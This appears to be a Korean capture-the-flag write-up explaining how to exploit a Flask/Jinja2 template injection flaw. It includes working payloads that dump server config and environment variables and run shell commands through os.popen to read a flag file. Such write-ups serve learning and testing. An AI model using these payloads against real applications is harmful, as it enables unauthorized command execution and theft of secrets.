
# 문제 풀이 과정: Flask SSTI 취약점

## 1. 문제 환경 분석

- 웹 서버가 **Flask** 프레임워크 기반임을 확인.
- 템플릿 엔진은 **Jinja2**.
- 사용자 입력이 템플릿에 바로 렌더링되어 **SSTI(Server-Side Template Injection)** 취약점이 존재함을 추정.

## 2. SSTI 페이로드 테스트

- `{{config.items()}}` 등 Jinja2 표현식으로 서버 내부 변수 출력이 가능한지 확인.
- 정상적으로 서버의 config 값들이 출력되며 SSTI 취약점이 존재함을 확신.

## 3. 서버 내부 정보 수집

- 환경 변수 및 서버 디렉토리 정보는 플래그 위치를 추정하는 데 매우 중요.
- Jinja2 객체의 글로벌 변수에서 **os 모듈** 접근 시도:
  - 페이로드 예시:  
    ```
    {{cycler.__init__.__globals__.os.environ}}
    ```
- 출력 결과에서 현재 작업 디렉토리(`PWD`)가 `/challenge`임을 확인.

## 4. 플래그 파일 위치 추정

- CTF 환경에서 플래그 파일은 보통 `/flag`, `/challenge/flag`, `/challenge/flag.txt` 등에 위치.
- 환경 변수에서 `/challenge` 디렉토리임을 확인했으므로, 해당 경로에 플래그 파일이 있을 것으로 예상.

## 5. 플래그 파일 읽기

- Jinja2를 통한 명령 실행 페이로드를 활용하여 파일 내용 읽기 시도:
  ```
  {{cycler.__init__.__globals__.os.popen('cat /challenge/flag').read()}}
  ```
- 플래그가 정상적으로 출력됨!

## 6. 플래그 제출 및 문제 해결

- 출력된 플래그를 CTF 플랫폼에 제출하여 문제를 해결함.

---

# 전체 풀이 흐름 요약

1. SSTI 취약점 확인 (Jinja2 템플릿에 직접 접근)
2. 서버 환경 변수 및 디렉토리 정보 확인 (`PWD` 등)
3. 플래그 파일이 있을 만한 경로 추정
4. Jinja2 객체를 통해 OS 명령어 실행하여 플래그 파일 읽기
5. 플래그 획득 및 제출

---

## 사용한 주요 페이로드

```
{{config.items()}}
{{cycler.__init__.__globals__.os.environ}}
{{cycler.__init__.__globals__.os.popen('cat /challenge/flag').read()}}
```
